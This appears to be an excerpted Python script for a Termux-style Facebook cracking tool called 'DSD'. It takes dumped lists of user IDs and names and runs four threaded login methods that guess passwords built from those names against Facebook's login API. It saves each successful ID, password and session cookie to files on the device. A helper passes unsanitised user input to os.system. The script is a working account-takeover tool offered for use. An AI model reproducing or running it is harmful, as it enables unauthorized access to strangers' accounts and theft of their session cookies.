...
from concurrent.futures import ThreadPoolExecutor as sarfrazDSD
from string import * 
...
model2 = requests.get('https://github.com/mr-naain/nain/blob/main/Nain.txt').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
...
sys.stdout.write('\x1b]2; DSD\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;34m   .----------------.  .----------------. 
\033[1;35m   | .--------------. || .--------------. |
\033[1;36m   | |  ________    | || |    _______   | |
\033[1;34m   | | |_   ___ `.  | || |   /  ___  |  | |
\033[1;35m   | |   | |   `. \ | || |  |  (__ \_|  | |
\033[1;36m   | |   | |    | | | || |   '.___`-.   | |
\033[1;38m   | |  _| |___.' / | || |  |`\____) |  | |
\033[1;39m   | | |________.'  | || |  |_______.'  | |
\033[1;34m   | |              | || |              | |
\033[1;31m   | '--------------' || '--------------' |
 \033[1;35m   '----------------'  '----------------' 

\033[1;37m------------------------------------------------
\033[1;32m Owner   :              TH3 N9IN 
\033[1;31m Facebook:       N9IN X3 ALON3
\033[1;32m Github  :                 N9IN 62
\033[1;31m Version :                  19.8
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back DSD Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DSD] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DSDb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DSDb};{ckkk}"
                    print(f"\r{R} [DSD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/DSD_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DSD_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [DSD-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/DSD_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DSD] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [DSD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/DSD_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DSD_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [DSD-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[DSD] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[DSD] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [DSD-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/DSD_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazDSD(max_workers=30) as DSDworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                DSDworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                DSDworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                DSDworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                DSDworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/DSD.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/DSD.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    DSD = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+DSD+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + DSD )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back DSD Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/DSD.txt\n') 
        filepath = input("Put File Name: ")
